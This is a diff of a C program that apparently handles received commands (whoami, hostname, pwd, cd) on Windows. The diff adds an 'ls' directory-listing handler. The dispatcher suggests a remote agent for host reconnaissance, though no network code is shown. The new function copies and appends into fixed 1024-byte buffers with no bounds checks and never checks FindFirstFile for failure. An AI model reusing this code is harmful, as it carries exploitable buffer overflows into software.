@@ -15,6 +15,7 @@ char *whoamiCommand();
 char *hostnameCommand();
 char *pwdCommand();
 char *cdCommand(char *directory);
+char *lsCommand(char *directory);
 
 int main() {
     puts("Hello ASX");
@@ -112,9 +113,11 @@ char *executing(char *receive, char *arg) {
         task = hostnameCommand();
     else if (strcmp(receive, "pwd") == 0)
         task = pwdCommand();
-    else if (strcmp(receive, "cd") == 0) {
+    else if (strcmp(receive, "cd") == 0)
         task = cdCommand(arg);
-    } else
+    else if (strcmp(receive, "ls") == 0)
+        task = lsCommand(arg);
+    else
         task = "Not yet build";
     return task;
 }
@@ -159,4 +162,31 @@ char *cdCommand(char *directory) {
     }
     return directory;
 
+}
+
+char *lsCommand(char *directory) {
+    WIN32_FIND_DATA ffd;
+    LARGE_INTEGER filesize;
+    TCHAR szDir[1024];
+    if (directory == NULL)
+        directory = ".";
+    strcpy(szDir, _T(directory));
+    strcat(szDir, "\\*");
+    HANDLE hFind = FindFirstFile(szDir, &ffd);
+    char *buf = malloc(1024 * sizeof(char));
+    sprintf(buf, "Type\t\tSize\tName\n");
+    sprintf(buf + strlen(buf), "====\t\t====\t====\n");
+
+    do {
+      if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+         sprintf(buf + strlen(buf), "Directory\t?\t%s\n", ffd.cFileName);
+      } else {
+         filesize.LowPart = ffd.nFileSizeLow;
+         filesize.HighPart = ffd.nFileSizeHigh;
+         sprintf(buf + strlen(buf), "File\t\t%ld\t%s\n", filesize.QuadPart, ffd.cFileName);
+      }
+    } while (FindNextFile(hFind, &ffd) != 0);
+
+    FindClose(hFind);
+    return buf;
 }
